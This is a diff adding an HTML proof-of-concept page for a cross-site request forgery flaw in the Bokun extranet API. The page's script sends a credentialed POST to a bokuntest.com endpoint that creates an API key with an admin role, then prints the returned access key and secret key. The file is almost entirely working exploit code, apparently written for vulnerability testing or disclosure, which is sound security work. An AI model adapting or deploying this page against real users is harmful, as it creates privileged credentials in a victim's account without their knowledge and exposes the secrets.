@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bokun CSRF PoC - Admin API Key Creation</title>
+</head>
+<body>
+    <h1>Bokun CSRF Vulnerability Proof of Concept</h1>
+    <h2>Admin API Key Creation</h2>
+    
+    <p>This page demonstrates a <strong>critical CSRF vulnerability</strong> in the Bokun extranet API.
+       If a logged-in user visits this page, an <strong>Admin API key</strong> will be created without their knowledge.</p>
+    
+    <button onclick="createAdminApiKey()">Click to Test CSRF (Creates Admin API Key)</button>
+    
+    <div id="result"></div>
+    
+    <script>
+    function createAdminApiKey() {
+        // CSRF attack - creates an Admin API key
+        fetch('https://extranet.bokuntest.com/connections/api-keys', {
+            method: 'POST',
+            credentials: 'include',  // Sends cookies automatically
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Bokun-Fetch': 'true',
+            },
+            body: JSON.stringify({
+                title: 'CSRF-ATTACK-KEY',
+                role: 33211  // Admin role ID
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('result').innerHTML = 
+                '<h3 style="color: red;">CSRF Attack Successful!</h3>' +
+                '<p>Admin API Key Created:</p>' +
+                '<pre>' + JSON.stringify(data, null, 2) + '</pre>' +
+                '<p><strong>This Admin key can now be used to access the Bokun API with full privileges!</strong></p>' +
+                '<p>Access Key: ' + data.accessKey + '</p>' +
+                '<p>Secret Key: ' + data.secretKey + '</p>';
+        })
+        .catch(error => {
+            document.getElementById('result').innerHTML = 
+                '<h3>CSRF Attack Failed</h3>' +
+                '<p>Error: ' + error + '</p>';
+        });
+    }
+    </script>
+</body>
+</html>
